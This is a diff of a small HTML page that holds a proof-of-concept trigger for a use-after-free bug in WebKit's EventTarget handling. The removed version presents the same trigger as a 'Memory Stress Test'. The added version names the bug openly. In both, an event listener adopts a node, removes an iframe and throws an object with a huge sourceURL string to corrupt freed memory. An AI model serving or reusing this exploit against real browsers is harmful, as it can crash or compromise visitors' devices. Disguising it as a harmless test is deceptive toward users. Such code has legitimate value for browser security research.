@@ -1,32 +1,37 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <h3>Memory Stress Test</h3>
-    <button onclick="main()" style="padding: 20px; font-size: 20px;">Execute Memory Load</button>
+<p>Use-after-free in Webkit EventTarget.</p>
+<button onclick="main()">Click to trigger the bug</button>
 
-    <script>
-        function main() {
-            try {
-                const f = document.body.appendChild(document.createElement('iframe'));
-                const a = document.createElement('div');
-                const b = a.appendChild(document.createElement('div'));
+<script>
+function main() {
+    const f = document.body.appendChild(document.createElement('iframe'));
 
-                a.addEventListener('a', function() {
-                    document.adoptNode(a);
-                    f.remove();
-                    // استخدام حجم أصغر قليلاً للبدء بأمان
-                    throw { sourceURL: 'A'.repeat(1024 * 1024 * 16) };
-                });
+    const a = document.createElement('div');
+    const b = a.appendChild(document.createElement('div'));
 
-                b.addEventListener('a', () => {
-                    f.contentDocument.adoptNode(a);
-                });
+    a.addEventListener('a', eval(`(function () {
+        document.adoptNode(a);
+        f.remove();
 
-                b.dispatchEvent(new Event('a', { bubbles: true }));
-            } catch(e) {
-                alert("Status: " + e.message);
-            }
-        }
-    </script>
+        throw {
+            line: 1,
+            column: 1,
+            sourceURL: 'A'.repeat(1024 * 1024 * 32) + 'A'.repeat(1024 * 1024 * 32)
+        };
+    })`));
+
+    a.addEventListener('a', () => {});
+
+    b.addEventListener('a', () => {
+        f.contentDocument.adoptNode(a);
+    });
+
+    b.dispatchEvent(new Event('a', { bubbles: true }));
+}
+
+</script>
+
 </body>
 </html>
